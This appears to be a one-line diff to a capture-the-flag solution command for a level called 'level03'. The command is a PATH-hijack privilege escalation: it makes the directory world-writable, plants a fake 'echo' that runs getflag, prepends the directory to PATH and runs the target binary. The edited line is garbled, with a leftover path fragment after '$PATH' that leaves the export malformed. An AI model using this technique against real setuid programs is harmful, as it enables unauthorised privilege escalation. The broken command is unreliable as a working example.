@@ -1,1 +1,1 @@
-hexdump -C level03; chmod 777 .; echo getflag > echo; chmod 777 echo; export PATH=/home/user/level03:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/Applications/VMware Fusion.app/Contents/Public:/Library/Apple/usr/bin; ./level03
+hexdump -C level03; chmod 777 .; echo getflag > echo; chmod 777 echo; export PATH=/home/user/level03:$PATH Fusion.app/Contents/Public:/Library/Apple/usr/bin; ./level03
